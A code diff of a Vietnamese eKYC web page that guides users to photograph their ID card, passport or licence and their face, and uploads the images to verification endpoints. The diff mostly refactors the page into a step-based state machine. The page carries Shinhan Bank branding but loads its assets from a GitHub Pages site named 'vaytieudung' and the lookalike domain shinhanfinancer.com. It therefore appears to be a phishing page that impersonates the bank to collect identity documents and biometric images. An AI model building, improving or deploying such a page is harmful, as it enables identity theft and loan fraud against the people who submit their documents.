@@ -61,9 +61,14 @@
     <title>eKYC SDK - Document Verification</title>
     <link rel="stylesheet" href="css/styles.css">
     <link rel="stylesheet" href="css/image-styles.css">
+    <style>
+        .hidden { display: none !important; }
+        .transition { transition: opacity 0.3s ease; }
+        .fade-out { opacity: 0; }
+        .fade-in { opacity: 1; }
+    </style>
 </head>
 <body>
-    <!-- Header with Language Selector -->
     <header class="header">
         <div class="language-selector">
             <select id="languageSelect">
@@ -73,41 +78,28 @@
         </div>
     </header>
 
-    <!-- Main Document Selection Screen -->
     <main id="mainScreen" class="main-screen">
         <div class="container">
             <h1 id="mainTitle" class="main-title">Xác thực giấy tờ</h1>
             <p id="mainSubtitle" class="main-subtitle">Chọn giấy tờ bạn muốn xác thực</p>
-            
             <div class="doc-cards-container">
                 <div class="doc-card" data-doc-type="id-card">
-                    <div class="doc-icon">
-                        <img src="https://vaytieudung.github.io/shinhanbank/lib/icon_id.png" alt="Biểu tượng thẻ căn cước" />
-                    </div>
+                    <div class="doc-icon"><img src="https://vaytieudung.github.io/shinhanbank/lib/icon_id.png" alt="Biểu tượng thẻ căn cước" /></div>
                     <span id="idCardText">Chứng minh thư, Thẻ căn cước</span>
                     <div class="arrow">›</div>
                 </div>
-                
                 <div class="doc-card" data-doc-type="passport">
-                    <div class="doc-icon">
-                        <img src="https://vaytieudung.github.io/shinhanbank/lib/icon_passport.png" alt="Biểu tượng Hộ chiếu" />
-                    </div>
+                    <div class="doc-icon"><img src="https://vaytieudung.github.io/shinhanbank/lib/icon_passport.png" alt="Biểu tượng Hộ chiếu" /></div>
                     <span id="passportText">Hộ chiếu</span>
                     <div class="arrow">›</div>
                 </div>
-                
                 <div class="doc-card" data-doc-type="license">
-                    <div class="doc-icon">
-                        <img src="https://vaytieudung.github.io/shinhanbank/lib/icon_driver_license.png" alt="Biểu tượng Bằng lái xe" />
-                    </div>
+                    <div class="doc-icon"><img src="https://vaytieudung.github.io/shinhanbank/lib/icon_driver_license.png" alt="Biểu tượng Bằng lái xe" /></div>
                     <span id="licenseText">Bằng lái xe</span>
                     <div class="arrow">›</div>
                 </div>
-                
                 <div class="doc-card" data-doc-type="other">
-                    <div class="doc-icon">
-                        <img src="https://vaytieudung.github.io/shinhanbank/lib/icon_other.png" alt="Biểu tượng Giấy tờ khác" />
-                    </div>
+                    <div class="doc-icon"><img src="https://vaytieudung.github.io/shinhanbank/lib/icon_other.png" alt="Biểu tượng Giấy tờ khác" /></div>
                     <span id="otherText">Giấy tờ khác</span>
                     <div class="arrow">›</div>
                 </div>
@@ -115,81 +107,58 @@
         </div>
     </main>
 
-    <!-- Instruction Modal -->
-    <div id="instructionModal" class="modal hidden">
+    <div id="instructionModal" class="modal transition">
         <div class="modal-overlay"></div>
         <div class="modal-content">
             <button class="modal-close" id="modalClose">×</button>
             <h2 id="modalTitle">Hướng dẫn chụp ảnh CMT, CCCD</h2>
-            
             <div class="instruction-steps">
                 <div class="step">
-                    <div class="step-image">
-                        <img src="https://vaytieudung.github.io/shinhanbank/lib/cmt_mt.png" alt="Ảnh mặt trước hợp lệ" class="step-img" />
-                        <div class="frame"></div>
-                    </div>
+                    <div class="step-image"><img src="https://vaytieudung.github.io/shinhanbank/lib/cmt_mt.png" alt="Ảnh mặt trước hợp lệ" class="step-img" /><div class="frame"></div></div>
                     <p id="step1Text">Bước 1: Chụp mặt trước</p>
                 </div>
-                
                 <div class="step">
-                    <div class="step-image">
-                        <img src="https://vaytieudung.github.io/shinhanbank/lib/cmt_ms.png" alt="Ảnh mặt sau hợp lệ" class="step-img" />
-                        <div class="frame"></div>
-                    </div>
+                    <div class="step-image"><img src="https://vaytieudung.github.io/shinhanbank/lib/cmt_ms.png" alt="Ảnh mặt sau hợp lệ" class="step-img" /><div class="frame"></div></div>
                     <p id="step2Text">Bước 2: Chụp mặt sau</p>
                 </div>
             </div>
-            
             <div class="instructions-text">
                 <ul>
                     <li id="instruction1">Đưa giấy tờ vào gần camera sao cho 4 góc của giấy tờ trùng với vùng giới hạn</li>
                     <li id="instruction2">Chụp rõ nét và đầy đủ thông tin trên giấy tờ</li>
                 </ul>
             </div>
-            
             <div class="bad-examples">
                 <div class="bad-example">
-                    <div class="bad-image blurry">
-                        <img src="https://vaytieudung.github.io/shinhanbank/lib/mo.png" alt="Ảnh bị mờ" class="bad-img" />
-                    </div>
+                    <div class="bad-image blurry"><img src="https://vaytieudung.github.io/shinhanbank/lib/mo.png" alt="Ảnh bị mờ" class="bad-img" /></div>
                     <p id="badExample1">Không chụp quá mờ</p>
                 </div>
                 <div class="bad-example">
-                    <div class="bad-image tilted">
-                        <img src="https://vaytieudung.github.io/shinhanbank/lib/matgoc.png" alt="Ảnh bị che góc" class="bad-img" />
-                    </div>
+                    <div class="bad-image tilted"><img src="https://vaytieudung.github.io/shinhanbank/lib/matgoc.png" alt="Ảnh bị che góc" class="bad-img" /></div>
                     <p id="badExample2">Không chụp mất góc</p>
                 </div>
                 <div class="bad-example">
-                    <div class="bad-image glare">
-                        <img src="https://vaytieudung.github.io/shinhanbank/lib/loasang.png" alt="Ảnh bị lóa" class="bad-img" />
-                    </div>
+                    <div class="bad-image glare"><img src="https://vaytieudung.github.io/shinhanbank/lib/loasang.png" alt="Ảnh bị lóa" class="bad-img" /></div>
                     <p id="badExample3">Không chụp lóa sáng</p>
                 </div>
             </div>
-            
             <button id="startCapture" class="start-btn">BẮT ĐẦU</button>
         </div>
     </div>
 
-    <!-- Camera Interface -->
-    <section id="cameraInterface" class="camera-interface hidden">
+    <section id="cameraInterface" class="camera-interface transition">
         <div class="camera-header">
             <h2 id="cameraTitle">CHỤP MẶT TRƯỚC</h2>
             <div id="progressIndicator" class="progress">Bước 1/4</div>
         </div>
-        
         <div class="camera-container">
             <video id="videoElement" autoplay muted playsinline></video>
             <canvas id="canvasElement" style="display: none;"></canvas>
-            <div class="camera-overlay">
-                <div class="frame-guide"></div>
-            </div>
+            <div class="camera-overlay"><div class="frame-guide"></div></div>
             <div id="faceDetectionOverlay" class="face-overlay"></div>
         </div>
-        
         <div class="camera-controls">
-            <button id="captureBtn" class="capture-btn">
+            <button id="captureBtn" class="capture-btn" aria-disabled="false">
                 <span class="camera-icon">📷︎</span>
                 <span id="captureBtnText">CHỤP ẢNH</span>
             </button>
@@ -198,48 +167,34 @@
                 <span id="uploadBtnText">TẢI ẢNH LÊN</span>
             </button>
         </div>
-        
         <div class="camera-footer">
             <p id="cameraInstructions">Xin vui lòng đặt giấy tờ nằm vừa khung hình chữ nhật, chụp đủ ánh sáng và rõ nét</p>
             <a href="#" id="guideLink">Hướng dẫn</a>
         </div>
-        
         <input type="file" id="fileInput" accept="image/*" style="display: none;">
     </section>
 
-    <!-- Face Verification Screen -->
-    <section id="faceVerification" class="face-verification hidden">
+    <section id="faceVerification" class="face-verification transition">
         <div class="face-header">
             <h2 id="faceTitle">XÁC THỰC KHUÔN MẶT</h2>
             <div id="faceProgressIndicator" class="progress">Bước 3/4</div>
         </div>
-        
         <div class="face-container">
             <video id="faceVideoElement" autoplay muted playsinline></video>
             <canvas id="faceCanvasElement" style="display: none;"></canvas>
-            <div class="face-guide">
-                <div class="face-oval"></div>
-            </div>
+            <div class="face-guide"><div class="face-oval"></div></div>
             <div id="faceDetectionStatus" class="face-status"></div>
         </div>
-        
         <div class="face-controls">
-            <button id="faceCaptureBtn" class="capture-btn">
+            <button id="faceCaptureBtn" class="capture-btn" aria-disabled="false">
                 <span class="camera-icon">📷︎</span>
                 <span id="faceCaptureBtnText">CHỤP ẢNH</span>
             </button>
         </div>
-        
         <div class="face-instructions">
             <p id="faceInstructions">Đặt khuôn mặt vào khung hình oval và giữ yên</p>
             <div class="face-guide-video">
-                <video 
-                    src="https://www.shinhanfinancer.com/lib/vietnamese-tutorial.mp4" 
-                    poster="https://via.placeholder.com/320x240/00d4aa/ffffff?text=Face+Guide+Video"
-                    controls 
-                    muted 
-                    preload="none"
-                    class="guide-video">
+                <video src="https://www.shinhanfinancer.com/lib/vietnamese-tutorial.mp4" poster="https://via.placeholder.com/320x240/00d4aa/ffffff?text=Face+Guide+Video" controls muted preload="none" class="guide-video">
                     <p>Trình duyệt của bạn không hỗ trợ video. <a href="https://www.shinhanfinancer.com/lib/vietnamese-tutorial.mp4">Tải video hướng dẫn</a></p>
                 </video>
                 <p class="video-caption">Video hướng dẫn xác thực khuôn mặt</p>
@@ -247,7 +202,6 @@
         </div>
     </section>
 
-    <!-- Error Message Container -->
     <div id="errorMessage" class="error-message hidden">
         <div class="error-content">
             <span class="error-icon">❗︎</span>
@@ -256,7 +210,6 @@
         </div>
     </div>
 
-    <!-- Loading Overlay -->
     <div id="loadingOverlay" class="loading-overlay hidden">
         <div class="loading-content">
             <div class="loading-spinner"></div>
@@ -264,27 +217,25 @@
         </div>
     </div>
 
-    <!-- Scripts from CDN -->
     <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js" defer></script>
     <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js" defer></script>
     <script src="https://cdn.jsdelivr.net/npm/lottie-web@5.12.2/build/player/lottie.min.js" defer></script>
     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" defer></script>
     <script src="js/app.js" defer></script>
     <script>
-        // State Management
         window.verificationState = {
+            currentStep: 0, // 0: Main, 1: Instructions, 2: Front Image, 3: Back Image, 4: Face Verification
             documentType: null,
             frontImageVerified: false,
             backImageVerified: false,
             faceVerified: false,
             retryCount: 0,
-            maxRetries: 3
+            maxRetries: 3,
+            cameraStream: null
         };
 
-        // Flag to indicate inline script control
         window.ekycInlineControl = true;
 
-        // DOM Elements
         const mainScreen = document.getElementById('mainScreen');
         const instructionModal = document.getElementById('instructionModal');
         const cameraInterface = document.getElementById('cameraInterface');
@@ -302,13 +253,17 @@
         const errorClose = document.getElementById('errorClose');
         const guideLink = document.getElementById('guideLink');
         const faceCaptureBtn = document.getElementById('faceCaptureBtn');
+        const videoElement = document.getElementById('videoElement');
+        const faceVideoElement = document.getElementById('faceVideoElement');
 
-        // Initialize Camera with Retry Logic
         async function startCamera(videoElement, facingMode = 'environment') {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-                videoElement.srcObject = stream;
-                window.verificationState.retryCount = 0; // Reset retry count on success
+                if (!window.verificationState.cameraStream) {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+                    window.verificationState.cameraStream = stream;
+                    videoElement.srcObject = stream;
+                }
+                window.verificationState.retryCount = 0;
             } catch (err) {
                 if (window.verificationState.retryCount < window.verificationState.maxRetries) {
                     window.verificationState.retryCount++;
@@ -321,7 +276,6 @@
             }
         }
 
-        // Show Error Message with Accessibility
         function showError(message) {
             errorText.textContent = message;
             errorMessage.setAttribute('role', 'alert');
@@ -329,85 +283,109 @@
             errorText.focus();
         }
 
-        // Hide Error Message
         errorClose.addEventListener('click', () => {
+            if (!window.ekycInlineControl) return;
             errorMessage.classList.add('hidden');
         });
 
-        // Reset to Main Screen
         function resetToMainScreen() {
-            resetVerificationState();
-            mainScreen.classList.remove('hidden');
-            instructionModal.classList.add('hidden');
-            cameraInterface.classList.add('hidden');
-            faceVerification.classList.add('hidden');
-            if (document.getElementById('videoElement').srcObject) {
-                document.getElementById('videoElement').srcObject.getTracks().forEach(track => track.stop());
-            }
-            if (document.getElementById('faceVideoElement').srcObject) {
-                document.getElementById('faceVideoElement').srcObject.getTracks().forEach(track => track.stop());
-            }
-        }
-
-        // Reset Verification State
-        function resetVerificationState() {
+            window.verificationState.currentStep = 0;
             window.verificationState.documentType = null;
             window.verificationState.frontImageVerified = false;
             window.verificationState.backImageVerified = false;
             window.verificationState.faceVerified = false;
             window.verificationState.retryCount = 0;
-            cameraTitle.textContent = 'CHỤP MẶT TRƯỚC';
-            progressIndicator.textContent = 'Bước 1/4';
-            faceVerification.classList.add('hidden');
+            if (window.verificationState.cameraStream) {
+                window.verificationState.cameraStream.getTracks().forEach(track => track.stop());
+                window.verificationState.cameraStream = null;
+            }
+            updateUI();
         }
 
-        // Document Selection
+        function updateUI() {
+            const sections = [mainScreen, instructionModal, cameraInterface, faceVerification];
+            sections.forEach(section => {
+                section.classList.add('hidden', 'fade-out');
+                setTimeout(() => section.classList.remove('fade-out'), 300);
+            });
+
+            let nextStepText = '';
+            switch (window.verificationState.currentStep) {
+                case 0: // Main Screen
+                    mainScreen.classList.remove('hidden', 'fade-out');
+                    mainScreen.classList.add('fade-in');
+                    break;
+                case 1: // Instructions
+                    instructionModal.classList.remove('hidden', 'fade-out');
+                    instructionModal.classList.add('fade-in');
+                    break;
+                case 2: // Front Image
+                    if (!window.verificationState.frontImageVerified) {
+                        cameraInterface.classList.remove('hidden', 'fade-out');
+                        cameraInterface.classList.add('fade-in');
+                        cameraTitle.textContent = 'CHỤP MẶT TRƯỚC';
+                        progressIndicator.textContent = 'Bước 1/4';
+                        if (!window.verificationState.cameraStream) startCamera(videoElement, 'environment');
+                        nextStepText = 'Hoàn thành chụp mặt trước để tiếp tục.';
+                    }
+                    break;
+                case 3: // Back Image
+                    if (window.verificationState.frontImageVerified && !window.verificationState.backImageVerified) {
+                        cameraInterface.classList.remove('hidden', 'fade-out');
+                        cameraInterface.classList.add('fade-in');
+                        cameraTitle.textContent = 'CHỤP MẶT SAU';
+                        progressIndicator.textContent = 'Bước 2/4';
+                        if (!window.verificationState.cameraStream) startCamera(videoElement, 'environment');
+                        nextStepText = 'Hoàn thành chụp mặt sau để tiếp tục.';
+                    }
+                    break;
+                case 4: // Face Verification
+                    if (window.verificationState.backImageVerified && !window.verificationState.faceVerified) {
+                        faceVerification.classList.remove('hidden', 'fade-out');
+                        faceVerification.classList.add('fade-in');
+                        faceProgressIndicator.textContent = 'Bước 3/4';
+                        if (!window.verificationState.cameraStream) startCamera(faceVideoElement, 'user');
+                        nextStepText = 'Hoàn thành xác thực khuôn mặt để hoàn tất.';
+                    }
+                    break;
+            }
+            if (nextStepText) showError(nextStepText);
+        }
+
         document.querySelectorAll('.doc-card').forEach(card => {
             card.addEventListener('click', () => {
-                if (!window.ekycInlineControl) return; // Prevent conflicts with js/app.js
-                resetVerificationState();
+                if (!window.ekycInlineControl || window.verificationState.currentStep !== 0) return;
                 window.verificationState.documentType = card.dataset.docType;
-                instructionModal.classList.remove('hidden');
-                mainScreen.classList.add('hidden');
-                guardFaceVerification();
+                window.verificationState.currentStep = 1;
+                updateUI();
             });
         });
 
-        // Modal Interactions
         modalClose.addEventListener('click', () => {
-            if (!window.ekycInlineControl) return;
+            if (!window.ekycInlineControl || window.verificationState.currentStep !== 1) return;
             resetToMainScreen();
         });
 
         startCapture.addEventListener('click', () => {
-            if (!window.ekycInlineControl) return;
-            instructionModal.classList.add('hidden');
-            cameraInterface.classList.remove('hidden');
-            faceVerification.classList.add('hidden');
-            startCamera(document.getElementById('videoElement'), 'environment');
-            cameraTitle.textContent = 'CHỤP MẶT TRƯỚC';
-            progressIndicator.textContent = 'Bước 1/4';
-            captureBtn.setAttribute('aria-disabled', 'false');
-            guardFaceVerification();
+            if (!window.ekycInlineControl || window.verificationState.currentStep !== 1) return;
+            window.verificationState.currentStep = 2;
+            updateUI();
         });
 
         guideLink.addEventListener('click', (e) => {
-            if (!window.ekycInlineControl) return;
+            if (!window.ekycInlineControl || window.verificationState.currentStep < 2 || window.verificationState.currentStep > 3) return;
             e.preventDefault();
-            instructionModal.classList.remove('hidden');
-            cameraInterface.classList.add('hidden');
-            faceVerification.classList.add('hidden');
-            guardFaceVerification();
+            window.verificationState.currentStep = 1;
+            updateUI();
         });
 
-        // File Upload Handling
         uploadBtn.addEventListener('click', () => {
-            if (!window.ekycInlineControl) return;
+            if (!window.ekycInlineControl || window.verificationState.currentStep < 2) return;
             fileInput.click();
         });
 
         fileInput.addEventListener('change', async () => {
-            if (!window.ekycInlineControl) return;
+            if (!window.ekycInlineControl || window.verificationState.currentStep < 2) return;
             const file = fileInput.files[0];
             if (!file || !['image/jpeg', 'image/png'].includes(file.type)) {
                 showError('Vui lòng chọn file JPEG hoặc PNG.');
@@ -420,9 +398,8 @@
             await verifyImage(file);
         });
 
-        // Capture Image
         captureBtn.addEventListener('click', async () => {
-            if (!window.ekycInlineControl || captureBtn.getAttribute('aria-disabled') === 'true') return;
+            if (!window.ekycInlineControl || captureBtn.getAttribute('aria-disabled') === 'true' || window.verificationState.currentStep < 2) return;
             captureBtn.setAttribute('aria-disabled', 'true');
             const video = document.getElementById('videoElement');
             const canvas = document.getElementById('canvasElement');
@@ -435,17 +412,14 @@
             captureBtn.setAttribute('aria-disabled', 'false');
         });
 
-        // Image Verification Logic
         async function verifyImage(file) {
             if (!window.ekycInlineControl) return;
             const formData = new FormData();
             formData.append('image', file);
             formData.append('documentType', window.verificationState.documentType);
-            formData.append('side', window.verificationState.frontImageVerified ? 'back' : 'front');
+            formData.append('side', !window.verificationState.frontImageVerified ? 'front' : 'back');
 
             try {
-                // Simulated API call (replace with actual endpoint in js/app.js)
-                // Note: Backend must implement server-side validation for file type, size, and image quality
                 const response = await fetch('/api/verify-image', {
                     method: 'POST',
                     headers: { 'Authorization': 'Bearer <your-token>' },
@@ -458,18 +432,12 @@
 
                 if (!window.verificationState.frontImageVerified) {
                     window.verificationState.frontImageVerified = true;
-                    cameraTitle.textContent = 'CHỤP MẶT SAU';
-                    progressIndicator.textContent = 'Bước 2/4';
-                    window.verificationState.retryCount = 0;
+                    window.verificationState.currentStep = 3;
                 } else if (!window.verificationState.backImageVerified) {
                     window.verificationState.backImageVerified = true;
-                    cameraInterface.classList.add('hidden');
-                    faceVerification.classList.remove('hidden');
-                    document.getElementById('videoElement').srcObject.getTracks().forEach(track => track.stop());
-                    startCamera(document.getElementById('faceVideoElement'), 'user');
-                    faceProgressIndicator.textContent = 'Bước 3/4';
-                    window.verificationState.retryCount = 0;
+                    window.verificationState.currentStep = 4;
                 }
+                updateUI();
             } catch (error) {
                 window.verificationState.retryCount++;
                 if (window.verificationState.retryCount >= window.verificationState.maxRetries) {
@@ -481,18 +449,8 @@
             }
         }
 
-        // Face Verification with Guard
         faceCaptureBtn.addEventListener('click', async () => {
-            if (!window.ekycInlineControl) return;
-            if (!window.verificationState.frontImageVerified || !window.verificationState.backImageVerified) {
-                showError('Vui lòng hoàn thành xác thực mặt trước và mặt sau trước.');
-                faceVerification.classList.add('hidden');
-                cameraInterface.classList.remove('hidden');
-                startCamera(document.getElementById('videoElement'), 'environment');
-                cameraTitle.textContent = window.verificationState.frontImageVerified ? 'CHỤP MẶT SAU' : 'CHỤP MẶT TRƯỚC';
-                progressIndicator.textContent = window.verificationState.frontImageVerified ? 'Bước 2/4' : 'Bước 1/4';
-                return;
-            }
+            if (!window.ekycInlineControl || window.verificationState.currentStep !== 4) return;
             if (faceCaptureBtn.getAttribute('aria-disabled') === 'true') return;
             faceCaptureBtn.setAttribute('aria-disabled', 'true');
             const video = document.getElementById('faceVideoElement');
@@ -502,7 +460,6 @@
             canvas.getContext('2d').drawImage(video, 0, 0);
             const imageData = canvas.toDataURL('image/jpeg');
             try {
-                // Simulated face verification API call
                 const response = await fetch('/api/verify-face', {
                     method: 'POST',
                     headers: { 'Authorization': 'Bearer <your-token>' },
@@ -528,41 +485,13 @@
             }
         });
 
-        // Prevent Manual Access to Face Verification
-        function guardFaceVerification() {
-            if (!window.verificationState.frontImageVerified || !window.verificationState.backImageVerified) {
-                faceVerification.classList.add('hidden');
-                faceVerification.style.display = 'none'; // Additional safeguard
-                cameraInterface.classList.remove('hidden');
-                cameraTitle.textContent = window.verificationState.frontImageVerified ? 'CHỤP MẶT SAU' : 'CHỤP MẶT TRƯỚC';
-                progressIndicator.textContent = window.verificationState.frontImageVerified ? 'Bước 2/4' : 'Bước 1/4';
-                if (!document.getElementById('videoElement').srcObject) {
-                    startCamera(document.getElementById('videoElement'), 'environment');
-                }
-            }
-        }
-
-        // Monitor DOM changes and periodic checks
-        const observer = new MutationObserver(() => {
-            if (window.ekycInlineControl) guardFaceVerification();
-        });
-        observer.observe(faceVerification, { attributes: true, attributeFilter: ['class', 'style'] });
-
-        // Periodic check to ensure faceVerification remains hidden
-        setInterval(() => {
-            if (window.ekycInlineControl) guardFaceVerification();
-        }, 1000);
-
-        // Initialize on Page Load
         document.addEventListener('DOMContentLoaded', () => {
-            resetVerificationState();
-            guardFaceVerification();
+            resetToMainScreen();
         });
 
-        // Lazy Load Guide Video
         const guideVideo = document.querySelector('.guide-video');
         const observerVideo = new IntersectionObserver((entries) => {
-            if (entries[0].isIntersecting && window.verificationState.frontImageVerified && window.verificationState.backImageVerified) {
+            if (entries[0].isIntersecting && window.verificationState.currentStep === 4) {
                 guideVideo.src = guideVideo.getAttribute('src');
                 observerVideo.disconnect();
             }
